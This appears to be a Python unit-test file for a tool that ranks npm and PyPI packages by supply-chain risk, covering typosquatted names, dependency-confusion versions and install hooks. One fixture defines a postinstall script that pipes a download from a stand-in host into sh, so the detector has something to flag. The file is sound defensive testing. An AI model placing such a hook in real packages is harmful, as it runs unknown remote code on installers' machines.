from __future__ import annotations

import unittest

from huginn.triage import rank, score_npm, score_pypi, typosquat_target


def _npm(version="1.0.0", scripts=None, description="", repository=None):
    manifest = {"scripts": scripts or {}, "description": description}
    if repository:
        manifest["repository"] = repository
    return {"versions": {version: manifest}}


class TyposquatTests(unittest.TestCase):
    def test_one_edit_and_decoy_suffix_are_squats(self):
        self.assertEqual(typosquat_target("npm", "lodahs"), "lodash")        # swap
        self.assertEqual(typosquat_target("npm", "expresss"), "express")     # insert
        self.assertEqual(typosquat_target("pypi", "reqests"), "requests")    # delete
        self.assertEqual(typosquat_target("pypi", "colorama-utils"), "colorama")

    def test_real_and_unrelated_names_are_not(self):
        self.assertEqual(typosquat_target("npm", "lodash"), "")
        self.assertEqual(typosquat_target("npm", "mysql2"), "")              # popular itself
        self.assertEqual(typosquat_target("pypi", "my-weather-cli"), "")


class ScoreTests(unittest.TestCase):
    def test_network_install_hook_outranks_a_plain_package(self):
        evil = score_npm("left-padx", "1.0.0", _npm(scripts={"postinstall": "curl https://x.io/a | sh"}))
        plain = score_npm("my-lib", "1.0.0", _npm(description="A library",
                                                    repository={"url": "git+https://github.com/a/b"}))
        self.assertGreaterEqual(evil.score, 7)
        self.assertIn("install hook fetches or runs code", evil.reasons)
        self.assertEqual(plain.score, 0)

    def test_dependency_confusion_version(self):
        t = score_npm("acme-internal-auth", "99.1.0", _npm("99.1.0", description="x", repository="r"))
        self.assertIn("dependency-confusion version 99.1.0", t.reasons)

    def test_pypi_sdist_only_typosquat(self):
        project = {"info": {"summary": "", "description": ""},
                   "urls": [{"packagetype": "sdist"}]}
        t = score_pypi("reqeusts", "0.1", project)
        self.assertTrue({"sdist only: setup.py runs at install", "name imitates requests"} <= set(t.reasons))

    def test_rank_keeps_the_riskiest_above_the_floor(self):
        a, b, c = (object(), object(), object())
        from huginn.triage import Triage
        ranked = rank([(a, Triage(1)), (b, Triage(7)), (c, Triage(0))], top=5)
        self.assertEqual([item for item, _ in ranked], [b, a])


if __name__ == "__main__":
    unittest.main()
